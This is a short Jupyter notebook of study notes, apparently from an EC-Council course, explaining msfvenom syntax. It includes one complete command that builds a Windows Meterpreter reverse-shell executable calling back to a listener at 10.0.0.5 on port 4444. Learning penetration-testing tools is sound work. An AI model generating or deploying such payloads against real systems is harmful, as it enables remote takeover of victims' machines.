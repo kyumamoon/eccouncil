{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **Generating Payloads with Msfvenom**\n",
    "\n",
    "- Payloads: codes that are executed on the target system after exploitation.\n",
    "- Platforms: msfvenom can generate payloads for many platforms.\n",
    "- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Starting MSFVENOM**\n",
    "- msfvenom \\<command\\>"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Creating Payload**\n",
    "- msfvenom -p \\<payload\\> (...parameters/flags)\n",
    "    - Example:\n",
    "    - msfvenom -p \\<payload\\> LHOST=\\<LOCAL IP ADDRESS\\> LPORT=\\<LOCAL PORT\\> -f \\<format\\> > \\<outputFile\\>\n",
    "        - LHOST: host IP\n",
    "        - LPORT: target PORT, default 4444\n",
    "        - f, format\n",
    "    - Windows Meterpreter Reverse Shell Payload\n",
    "        - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > payload.exe\n",
    "        - can change x64 to x86"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
